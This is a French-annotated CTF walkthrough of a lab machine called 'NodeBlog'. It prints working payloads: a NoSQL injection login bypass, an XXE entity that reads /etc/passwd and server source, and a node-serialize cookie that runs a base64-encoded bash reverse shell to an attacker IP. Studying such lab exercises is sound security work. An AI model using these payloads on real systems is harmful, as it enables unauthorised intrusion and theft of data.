\chapter{NodeBlog}
\begin{itemize}
    \item {\bf technics}: xxe, node deserialization 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.139
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
|   256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
|_  256 2221e9f485908745161f733641ee3b32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}


\subsection{http}

à part \verb+http://10.10.11.139:5000/login+ pas grand chose

\begin{verbatim}
$ sqlmap -r /tmp/login.req  --batch
rien
\end{verbatim}

nosql ?

\begin{verbatim}
$ curl -i -XPOST http://10.10.11.139:5000/login/  \
    -H 'Content-Type: application/json' \
    -d '{"username": {"$gt": undefined}, "password": {"$gt": undefined}}'
HTTP/1.1 400 Bad Request
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 862
Date: Thu, 26 Jan 2023 05:06:10 GMT
Connection: keep-alive
Keep-Alive: timeout=5

SyntaxError....
$ curl -is -XPOST http://10.10.11.139:5000/login/ \
    -H 'Content-Type: application/json' \
    -d '{"user": "admin", "password": {"$ne": "wrongpassword"}}' \
    |grep Invalid

YES
\end{verbatim}


si on essaie de creer un article avec \verb+{{7*7}}+ ca plante 
\begin{verbatim}
Error: Failed to lookup view "articles/${path}" in views directory "/opt/blog/views"
    at Function.render (/opt/blog/node_modules/express/lib/application.js:580:17)
    at ServerResponse.render (/opt/blog/node_modules/express/lib/response.js:1012:7)
    at /opt/blog/routes/articles.js:81:17
    at runMicrotasks (<anonymous>)
    at processTicksAndRejections (internal/process/task_queues.js:95:5)
\end{verbatim}

la fonction upload semble demander un XML

\begin{verbatim}
Invalid XML Example: Example DescriptionExample Markdown
Invalid XML Example: <post><title>Example Post</title>
<description>Example Description</description>
<markdown>Example Markdown</markdown></post>
\end{verbatim}

\begin{verbatim}
$ cat payload.xml
<?xml version="1.0"?>
<!DOCTYPE pwn [
    <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<post>
    <title>$file;</title>
    <description>&file;</description>
    <markdown>&file;</markdown>
</post>

<!DOCTYPE html>
<html lang="en">
...SNIP...
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
admin:x:1000:1000:admin:/home/admin:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mongodb:x:109:117::/var/lib/mongodb:/usr/sbin/nologin
</textarea>
...SNIP...

\end{verbatim}
le fichier est reflect dans description et markdown

on peut leak le code grace à l'erreur précédente

\begin{verbatim}
<!ENTITY file SYSTEM "file:///opt/blog/routes/articles.js">
...SNIP...
const Article = require('./../models/article')
...SNIP...

<!ENTITY file SYSTEM "file:///opt/blog/models/article.js">
...SNIP...
...SNIP...
<!ENTITY file SYSTEM "file:///opt/blog/app.js">
ne marche pas
<!ENTITY file SYSTEM "file:///opt/blog/config.js">
ne marche pas
<!ENTITY file SYSTEM "file:///opt/blog/server.js">

const express = require('express')
const mongoose = require('mongoose')
const Article = require('./models/article')
const articleRouter = require('./routes/articles')
const loginRouter = require('./routes/login')
const serialize = require('node-serialize')
const methodOverride = require('method-override')
const fileUpload = require('express-fileupload')
const cookieParser = require('cookie-parser');
const crypto = require('crypto')
const cookie_secret = "UHC-SecretCookie"
//var session = require('express-session');
const app = express()

mongoose.connect('mongodb://localhost/blog')

app.set('view engine', 'ejs')
app.use(express.urlencoded({ extended: false }))
app.use(methodOverride('_method'))
app.use(fileUpload())
app.use(express.json());
app.use(cookieParser());
//app.use(session({secret: "UHC-SecretKey-123"}));

function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}


app.get('/', async (req, res) => {
    const articles = await Article.find().sort({
        createdAt: 'desc'
    })
    res.render('articles/index', { articles: articles, ip: req.socket.remoteAddress, authenticated: authenticated(req.cookies.auth) })
})

app.use('/articles', articleRouter)
app.use('/login', loginRouter)


app.listen(5000)

\end{verbatim}

bon visiblement on n'aura pas de creds bdd.

par contre on a un truc qui s'appel \verb+node-serialize+ => insecure
deserialization ?

\url{https://www.exploit-db.com/exploits/50036}{node-serialize' Remote Code
Execution}

\begin{verbatim}
$ searchsploit node-serialize
------------------------------------------------------ -------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ -------------------------
Node.JS - 'node-serialize' Remote Code Execution (2)  | nodejs/webapps/49552.py
Node.JS - 'node-serialize' Remote Code Execution (3)  | nodejs/webapps/50036.js
Node.JS - 'node-serialize' Remote Code Execution      | linux/remote/45265.js
\end{verbatim}

donc c'est visiblement le cookie qui est unserialized

\begin{verbatim}
$ cat rce.txt
{"rce":"_$$ND_FUNC$$_function() { require('child_process').exec('ping -c 3 10.10.16.6') }()"}
$ curl -i http://10.10.11.139:5000/ -H "Cookie: auth=$(cat rce.txt |pencode urlencodeall)"
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:36:17.494878 IP 10.10.11.139 > : ICMP echo request, id 1, seq 1, length 64

\end{verbatim}

on set le cookie 

le serveur web tourne mais ne ping pas







\begin{verbatim}
$ echo 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1' |base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0NDQgMD4mMQo=
$ cat rce.txt
{"rce":"_$$ND_FUNC$$_function() { require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42LzQ0NDQgMD4mMQo= | base64 -d | bash ') }()"}
$ curl -i http://10.10.11.139:5000/ -H "Cookie: auth=$(cat rce.txt |pencode urlencodeall)"

$ nc -lnvp 4444
admin@nodeblog:/opt/blog$
admin@nodeblog:/opt/blog$ python3 -c 'import pty; pty.spawn("/bin/sh")'

\end{verbatim}
